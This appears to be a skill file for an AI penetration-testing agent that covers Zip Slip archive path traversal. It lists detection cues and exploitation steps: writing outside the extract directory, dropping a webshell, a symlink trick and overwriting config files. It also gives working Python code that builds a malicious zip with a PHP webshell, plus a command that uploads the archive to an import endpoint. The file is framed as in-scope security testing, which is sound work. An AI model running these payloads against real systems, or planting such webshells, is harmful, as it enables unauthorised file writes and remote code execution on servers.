---
name: zip-slip
description: Zip Slip (CWE-22 in archives) — arbitrary file write via malicious archive paths (../.., absolute paths, symlinks). Use when the app extracts uploaded ZIP/TAR/JAR/RAR archives (import/export, theme upload, backup restore).
category: files-uploads
---

# Zip Slip (Archive Path Traversal)

## Detection
- Features that extract archives: bulk import, theme/plugin upload, backup restore, attachment archives.
- Check extraction code: does it sanitize member names? (node-adm-zip, Python zipfile, Java ZipEntry, PHP ZipArchive all vulnerable by default.)

## Exploitation
1. **Path traversal write**: archive member named `../../../../tmp/pwned` → write outside extract dir.
2. **Webshell drop**: write `../../public_html/shell.php` then request it.
3. **Symlink trick**: create a symlink member pointing to `/etc` then a member inside it → write through link.
4. **Absolute path member**: `/etc/cron.d/x` (only if extractor joins naively — rare but test).
5. **Overwrite config**: overwrite `.env`/`config.php` → RCE or secret injection.

## Payloads
```python
import zipfile
z = zipfile.ZipFile('evil.zip','w')
z.writestr('../../../../tmp/pwned', 'pwned')
z.writestr('../public/shell.php', '<?php system($_GET[c]); ?>')
z.close()
```

## Tool Commands (Windows)
```powershell
# craft + submit (via an in-scope upload endpoint)
python -c "
import zipfile, requests
z=zipfile.ZipFile('evil.zip','w')
z.writestr('../../../../tmp/zip-slip-proof','pwned')
z.close()
r=requests.post('$U/api/import', files={'file':open('evil.zip','rb')})
print(r.status_code)
"
# verify write on a path you can read back (if app echoes server path)
```

## Verification & Evidence
- Proof = file written outside extraction dir (read back via app, or app behavior changes, or LFI the written file).
- If no read-back, document exact target path + successful extraction exit code.